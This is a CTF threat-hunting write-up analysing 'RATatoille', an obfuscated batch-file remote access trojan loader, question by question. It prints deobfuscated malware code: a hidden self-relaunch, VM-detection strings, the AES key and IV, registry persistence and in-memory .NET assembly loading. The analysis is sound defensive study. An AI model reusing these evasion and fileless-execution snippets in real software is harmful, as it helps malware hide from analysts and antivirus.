# RATatoille - Threat Hunting Challenge Writeup

**CTF:** NullCTF 2025
**Category:** Threat Hunting
**Flag:** `nullctf{n3v3r_run_4ny7hing_y0u_find_0n_7h3_n37}`

---

## The Challenge

We're given a suspicious file called `RATatoille` (a play on the Pixar movie and "RAT" - Remote Access Trojan). It's a massive 11MB batch file with 1671 lines of heavily obfuscated code. Our job? Analyze this malware and answer a quiz about how it works.

The zip password is `malware` - always a good sign we're dealing with something spicy.

---

## Step 1: Unpacking the Obfuscation Layer

Opening the batch file, you're greeted with absolute chaos. Lines like:

```
%xYzAbc%e%RandomGarbage%c%MoreJunk%h%etc%o%...
```

This is a classic obfuscation technique. The malware defines thousands of garbage environment variables, then hides the real code by placing single characters between `%variable%` markers. Your eye (and most simple scanners) sees noise, but the batch interpreter only reads the characters *between* the `%` signs.

After stripping out the garbage, the batch file reveals its true form:
- `@echo off`
- `setlocal enabledelayedexpansion`
- A bunch of PowerShell commands
- A massive Base64 payload at the end

---

## Step 2: The Secret Handshake (Question 1)

The first thing the malware does is check if it was launched with a magic password:

```batch
if neq HCPrMNUTufgxpxMSH (
    powershell -windowstyle hidden -command Start-Process -FilePath '%~f0' -ArgumentList 'HCPrMNUTufgxpxMSH' -WindowStyle Hidden
    exit
)
```

**What's happening:** If you double-click the file normally, it doesn't have the secret argument. So it relaunches itself *with* the argument `HCPrMNUTufgxpxMSH` and hides the window. This is sneaky because:
1. The visible window closes immediately (looks like nothing happened)
2. The real malware runs hidden in the background
3. If an analyst runs it in a debugger without the argument, it behaves differently

**Answer:** `HCPrMNUTufgxpxMSH`

---

## Step 3: Know Your Victim (Question 2)

Here's where it gets interesting. The malware has a very specific target:

```powershell
if ((Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model | findstr /i 'WDS100T2B0A') -and
    (-not (Get-ChildItem -Path F:\ -Recurse | Where-Object { -not $_.PSIsContainer } | Measure-Object).Count))
    {exit 900}
```

This checks for:
- A disk model `WDS100T2B0A` (that's a Western Digital 1TB SSD)
- An empty F: drive

If BOTH conditions are true, the malware exits! This is targeted malware - it was built for a specific victim's machine and won't run on that exact hardware config. Probably the attacker's own machine they're using for testing, and they don't want to infect themselves.

**Answer:** `WDS100T2B0A, F:`

---

## Step 4: VM Detection (Question 3)

The malware really doesn't want to run in a sandbox or virtual machine (where security researchers analyze malware). It checks the disk model for known VM signatures:

```powershell
findstr /i 'QEMU'       # QEMU emulator
findstr /i 'DADY'       # Hyper-V virtual disks
findstr /i 'VirtualBox' # Oracle VirtualBox
findstr /i 'BOCHS_'     # Bochs emulator
findstr /i 'BXPC___'    # Bochs PC
```

If any of these strings appear in the disk model, it exits immediately. This is standard anti-analysis stuff - most malware researchers use VMs for safety, so malware authors try to detect and avoid them.

**Answer:** `QEMU DADY VirtualBox BOCHS_ BXPC___`

---

## Step 5: The Encryption (Question 4)

Once the malware passes all the checks, it needs to decrypt its actual payload. The PowerShell code reveals:

```powershell
function pXsN($oSgB){
    $vBUP = [System.Security.Cryptography.Aes]::Create();
    $vBUP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $vBUP.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    $vBUP.Key = [System.Convert]::FromBase64String('XPtZOUHY5OeenWFPBw1yCsPCGanSXRbZFoEprI16QF8=');
    $vBUP.IV = [System.Convert]::FromBase64String('FRxUQwvJ84LwrFZMYH8pPg==');
    # ... decrypt stuff
}
```

- **Algorithm:** AES-256
- **Mode:** CBC (Cipher Block Chaining)
- **Key:** `XPtZOUHY5OeenWFPBw1yCsPCGanSXRbZFoEprI16QF8=`
- **IV:** `FRxUQwvJ84LwrFZMYH8pPg==`

**Answer:** `XPtZOUHY5OeenWFPBw1yCsPCGanSXRbZFoEprI16QF8= FRxUQwvJ84LwrFZMYH8pPg== CBC`

---

## Step 6: Persistence via Registry (Question 5)

Malware needs to survive reboots. This one uses the Windows Registry:

```powershell
function TeY($sWfA){
    $registryPath = 'HKLM:\SOFTWARE\OOhhhm=';
    New-Item -Path $registryPath -Force;
    Set-ItemProperty -Path $registryPath -Name 'Map' -Value 'JwqQPuPifUgDBb;OPiFaAlNnjGnumFf;hPeGuZRgnnk';
    Set-ItemProperty -Path $registryPath -Name 'JwqQPuPifUgDBb' -Value $sWfA;  # The payload
    Set-ItemProperty -Path $registryPath -Name 'OPiFaAlNnjGnumFf' -Value '<AES Key>';
    Set-ItemProperty -Path $registryPath -Name 'hPeGuZRgnnk' -Value '<AES IV>';
}
```

It stores the encrypted payload, the AES key, and the IV all in the registry under a weird key name `OOhhhm=`. The `=` at the end is unusual and might help it avoid detection by some tools.

**Answer:** `HKLM:\SOFTWARE\OOhhhm=`

---

## Step 7: Loading the .NET Payload (Question 6)

Finally, the function that actually executes the malware:

```powershell
function Acwq($oSgB, $VkYP){
    $IYJz = [System.Reflection.Assembly]::Load([byte[]]$oSgB);
    $rWGl = $IYJz.EntryPoint;
    $rWGl.Invoke($null, $VkYP);
}
```

This is a classic "fileless" technique:
1. Load the decrypted bytes directly into memory as a .NET Assembly
2. Find the entry point (like `Main()`)
3. Execute it

The payload never touches the disk as an executable - it goes straight from encrypted blob to running code in memory. This makes it harder for antivirus to catch.

**Answer:** `Acwq`

---

## The Full Attack Chain

```
1. User double-clicks RATatoille.bat
2. Batch file relaunches itself with secret argument, hides window
3. Checks if running on attacker's machine (WDS100T2B0A + F:) -> exits if true
4. Checks for VM artifacts (QEMU, VirtualBox, etc.) -> exits if detected
5. Reads the encoded payload from the end of the batch file
6. Stores payload + keys in registry for persistence
7. Decrypts payload using AES-256-CBC
8. Decompresses with GZip
9. Loads directly into memory as .NET assembly
10. Executes the RAT
```

---

## Lessons Learned

The flag says it all: `nullctf{n3v3r_run_4ny7hing_y0u_find_0n_7h3_n37}`

**"Never run anything you find on the net"**

This malware is a great example of modern evasion techniques:
- Heavy obfuscation to avoid static analysis
- Anti-debugging with secret arguments
- Anti-VM checks to avoid sandboxes
- Fileless execution to avoid antivirus
- Registry persistence to survive reboots
- Targeted checks to avoid infecting the wrong machine

If you're analyzing malware, always use an isolated VM (or better, a dedicated analysis machine), and never run suspicious files on your main system!

---

## Tools Used

- Basic text editors and grep for deobfuscation
- Python for Base64/AES decryption attempts
- Brain cells for pattern recognition

GG!
